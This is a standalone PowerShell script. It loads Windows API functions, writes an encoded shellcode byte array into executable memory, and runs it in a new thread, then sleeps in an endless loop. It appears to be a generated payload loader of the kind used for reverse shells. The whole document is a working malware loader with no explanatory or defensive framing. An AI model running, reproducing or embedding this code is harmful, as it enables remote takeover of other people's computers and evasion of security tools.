
$fPS = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $fPS -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xe1,0xba,0x4a,0xc4,0x8d,0xa0,0xd9,0x74,0x24,0xf4,0x5e,0x31,0xc9,0xb1,0x57,0x83,0xc6,0x04,0x31,0x56,0x15,0x03,0x56,0x15,0xa8,0x31,0x71,0x48,0xae,0xba,0x8a,0x89,0xce,0x33,0x6f,0xb8,0xce,0x20,0xfb,0xeb,0xfe,0x23,0xa9,0x07,0x75,0x61,0x5a,0x93,0xfb,0xae,0x6d,0x14,0xb1,0x88,0x40,0xa5,0xe9,0xe9,0xc3,0x25,0xf3,0x3d,0x24,0x17,0x3c,0x30,0x25,0x50,0x20,0xb9,0x77,0x09,0x2f,0x6c,0x68,0x3e,0x65,0xad,0x03,0x0c,0x68,0xb5,0xf0,0xc5,0x8b,0x94,0xa6,0x5e,0xd2,0x36,0x48,0xb2,0x6f,0x7f,0x52,0xd7,0x55,0xc9,0xe9,0x23,0x22,0xc8,0x3b,0x7a,0xcb,0x67,0x02,0xb2,0x3e,0x79,0x42,0x75,0xa0,0x0c,0xba,0x85,0x5d,0x17,0x79,0xf7,0xb9,0x92,0x9a,0x5f,0x4a,0x04,0x47,0x61,0x9f,0xd3,0x0c,0x6d,0x54,0x97,0x4b,0x72,0x6b,0x74,0xe0,0x8e,0xe0,0x7b,0x27,0x07,0xb2,0x5f,0xe3,0x43,0x61,0xc1,0xb2,0x29,0xc4,0xfe,0xa5,0x91,0xb9,0x5a,0xad,0x3c,0xae,0xd6,0xec,0x28,0x5e,0x8c,0x7a,0xa9,0xf6,0x39,0xea,0xc7,0x6f,0x92,0x84,0x5b,0x18,0x3c,0x52,0x9b,0x33,0x71,0x87,0x30,0xe8,0x21,0x64,0xe4,0x66,0xfc,0xdc,0x73,0xd1,0xff,0x34,0xd0,0x4e,0x6a,0xb4,0x84,0x23,0x02,0x41,0x0a,0xc3,0xd2,0x5d,0xc7,0xc3,0xd2,0x9d,0xf7,0xf1,0x97,0xd7,0x5f,0xb6,0x17,0xb8,0x37,0x6f,0x91,0xa7,0x0e,0x70,0x74,0x5e,0x48,0xdd,0x1f,0x61,0x67,0x01,0x5b,0x32,0xd4,0x92,0x33,0xe6,0x8c,0x7c,0x57,0x5d,0x1f,0x47,0x58,0x8b,0xc9,0xdd,0xac,0x6b,0x9e,0xa1,0x82,0x93,0x5e,0x28,0x04,0xf9,0x5a,0x7a,0xaf,0xe1,0x34,0x12,0x5a,0x58,0x27,0x64,0x5b,0xb1,0x04,0x3b,0xf7,0x69,0xfd,0xd3,0xda,0x8b,0x19,0x58,0xda,0x41,0x9c,0x5e,0x51,0x60,0xd0,0x2b,0x43,0x1c,0x1e,0x66,0xd1,0x8b,0x21,0x5d,0x7c,0x74,0xb6,0x5d,0x91,0x74,0x46,0x35,0x91,0x74,0x06,0xc5,0xc2,0x1c,0xde,0x61,0xb7,0x39,0x21,0xbc,0xab,0x91,0x8d,0xb7,0x2b,0x42,0x5a,0xc7,0x93,0x6d,0x9a,0x94,0x85,0x05,0x88,0x8c,0xa3,0x34,0x53,0x65,0x36,0x78,0xd8,0x48,0xb2,0x7e,0x20,0x91,0x40,0x40,0x57,0xf0,0x13,0x82,0xc7,0x12,0xd6,0xfb,0x07,0x1d,0x28,0x3d,0xca,0xcf,0x7a,0x0b,0x12,0x21,0x49,0x4a,0x4c,0x0c,0x82,0x98,0x90;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$kDj=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($kDj.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$kDj,0,0,0);for (;;){Start-sleep 60};

